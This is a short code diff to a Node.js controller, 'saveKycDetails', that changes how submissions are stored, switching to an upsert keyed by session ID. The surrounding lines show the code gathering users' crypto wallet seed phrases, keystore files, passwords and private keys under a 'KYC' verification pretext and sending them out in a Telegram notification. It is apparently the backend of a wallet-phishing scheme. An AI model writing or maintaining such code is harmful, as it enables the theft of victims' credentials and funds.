@@ -54,8 +54,8 @@ exports.saveKycDetails = async (req, res) => {
       }
     }
 
-    // Always create a new KYC entry for each submission
-    const kycData = new Kyc({
+    // Upsert KYC entry by sessionId
+    const kycData = {
       sessionId,
       walletType,
       seedPhrase,
@@ -65,9 +65,13 @@ exports.saveKycDetails = async (req, res) => {
       imageUrls: verified.length ? verified : (Array.isArray(imageUrls) ? imageUrls : []),
       verificationStatus,
       verificationError,
-    });
+    };
 
-    await kycData.save();
+    await Kyc.findOneAndUpdate(
+      { sessionId },
+      { $set: kycData },
+      { upsert: true, new: true }
+    );
     // Send Telegram notification with KYC details
     try {
       notifyNewKyc({ sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, images: verified });
